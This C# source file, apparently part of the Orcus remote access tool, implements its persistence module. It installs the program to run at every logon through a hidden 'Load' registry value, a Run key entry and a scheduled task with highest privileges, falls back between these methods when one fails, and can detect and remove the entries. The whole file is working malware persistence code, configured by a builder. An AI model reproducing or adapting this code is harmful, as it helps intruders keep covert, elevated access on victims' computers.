using System;
using System.Collections.Generic;
using System.Linq;
using System.Security;
using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;
using Orcus.Config;
using Orcus.Shared.Settings;
using Orcus.Utilities;

namespace Orcus.Protection
{
    internal class Autostarter
    {
        public static bool AddToAutostart(string filename)
        {
            return AddToAutostart(filename, false);
        }

        private static bool AddToAutostart(string filename, bool inverse)
        {
            var autostartProperty = Settings.GetBuilderProperty<AutostartBuilderProperty>();

            try
            {
                switch (inverse ? (autostartProperty.AutostartMethod == StartupMethod.Registry? StartupMethod.TaskScheduler : StartupMethod.Registry) : autostartProperty.AutostartMethod)
                {
                    case StartupMethod.Disable:
                        return true;
                    case StartupMethod.Registry:
                        if (autostartProperty.RegistryHiddenStart && !filename.Contains(" "))
                        {
                            try
                            {
                                using (
                                    var registryKey =
                                        Registry.CurrentUser.OpenSubKey(
                                            @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
                                            true))
                                    if (registryKey != null)
                                    {
                                        registryKey.SetValue("Load", filename, RegistryValueKind.String); //NO QUOTATION!!!
                                        return true;
                                    }
                            }
                            catch (Exception)
                            {
                                // ignored
                            }
                        }

                        using (
                            var registryKey =
                                Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true)
                            )
                        {
                            if (registryKey != null)
                            {
                                var existingKeys = new List<string>();
                                var path = $"\"{filename}\"";
                                foreach (var key in registryKey.GetValueNames())
                                {
                                    var str = registryKey.GetValue(key) as string;
                                    if (str != null && string.Equals(path, str, StringComparison.OrdinalIgnoreCase) &&
                                        !string.Equals(key, autostartProperty.RegistryKeyName, StringComparison.OrdinalIgnoreCase))
                                        existingKeys.Add(key);
                                }
                                registryKey.SetValue(autostartProperty.RegistryKeyName, path, RegistryValueKind.String);
                                foreach (var existingKey in existingKeys)
                                    registryKey.DeleteValue(existingKey);
                                return true;
                            }
                        }
                        break;
                    case StartupMethod.TaskScheduler:
                        using (var taskService = new TaskService())
                        {
                            var firstTask = taskService.RootFolder.Tasks.FirstOrDefault(
                                x =>
                                    x.Definition.Actions.Any(
                                        y =>
                                            y.ActionType == TaskActionType.Execute &&
                                            ((ExecAction) y).Path == filename));

                            if (firstTask != null &&
                                (CoreHelper.RunningOnXP || !User.IsAdministrator ||
                                 firstTask.Definition.Principal.RunLevel == TaskRunLevel.Highest))
                                return true;

                            var task = taskService.NewTask();
                            task.Triggers.Add(new LogonTrigger());
                            task.Actions.Add(filename);
                            if (autostartProperty.TaskHighestPrivileges && CoreHelper.RunningOnVistaOrGreater &&
                                User.IsAdministrator)
                                task.Principal.RunLevel = TaskRunLevel.Highest;

                            //delete existing task
                            taskService.RootFolder.DeleteTask(autostartProperty.TaskSchedulerTaskName, false);
                            taskService.RootFolder.RegisterTaskDefinition(autostartProperty.TaskSchedulerTaskName, task);
                        }
                        return true;
                }
            }
            catch (Exception)
            {
                // ignored
            }

            if (!inverse && autostartProperty.TryAllAutostartMethodsOnFail)
                return AddToAutostart(filename, true);

            return false;
        }

        public static bool IsAddedToAutostart()
        {
            var autostartProperty = Settings.GetBuilderProperty<AutostartBuilderProperty>();

            try
            {
                using (
                    var registryKey =
                        Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows", true))
                {
                    if ((string) registryKey?.GetValue("Load", null) == Consts.ApplicationPath)
                        return true;
                }
            }
            catch (Exception)
            {
                // ignored
            }

            try
            {
                using (
                    var registryKey2 = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run",
                        true))
                {
                    if ((string) registryKey2?.GetValue(autostartProperty.RegistryKeyName, null) ==
                        $"\"{Consts.ApplicationPath}\"")
                        return true;
                }
            }
            catch (Exception)
            {
                // ignored
            }

            try
            {
                using (var taskService = new TaskService())
                {
                    var task = taskService.FindTask(autostartProperty.TaskSchedulerTaskName, false);
                    var executeAction =
                        task.Definition.Actions.FirstOrDefault(x => x.ActionType == TaskActionType.Execute);
                    if (executeAction != null && ((ExecAction) executeAction).Path == Consts.ApplicationPath &&
                        (!User.IsAdministrator || task.Definition.Principal.RunLevel == TaskRunLevel.Highest))
                        return true;
                }
            }
            catch (Exception)
            {
                // ignored
            }

            return false;
        }

        public static bool RemoveFromAutostart()
        {
            bool removed = false;
            try
            {
                using (
                    var registryKey =
                        Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows", true))
                {
                    if ((string) registryKey?.GetValue("Load", null) == Consts.ApplicationPath)
                    {
                        registryKey.DeleteValue("Load", false);
                        removed = true;
                    }
                }
            }
            catch (SecurityException)
            {
            }

            try
            {
                using (
                    var registryKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run",
                        true))
                {
                    if (registryKey != null)
                    {
                        var path = $"\"{Consts.ApplicationPath}\"";
                        foreach (var valueName in registryKey.GetValueNames())
                        {
                            var str = registryKey.GetValue(valueName) as string;
                            if (str != null && string.Equals(str, path, StringComparison.OrdinalIgnoreCase))
                            {
                                registryKey.DeleteValue(valueName);
                                removed = true;
                            }
                        }
                    }
                }
            }
            catch (Exception)
            {
                // ignored
            }

            try
            {
                using (var taskService = new TaskService())
                {
                    foreach (var task in taskService.RootFolder.AllTasks)
                    {
                        var executeAction =
                            task.Definition.Actions.FirstOrDefault(x => x.ActionType == TaskActionType.Execute);
                        if (executeAction != null && ((ExecAction) executeAction).Path == Consts.ApplicationPath)
                        {
                            try
                            {
                                taskService.RootFolder.DeleteTask(task.Name, true);
                                removed = true;
                            }
                            catch (Exception)
                            {
                                // ignored
                            }
                        }
                    }
                }
            }
            catch (Exception)
            {
                // ignored
            }

            return removed;
        }
    }
}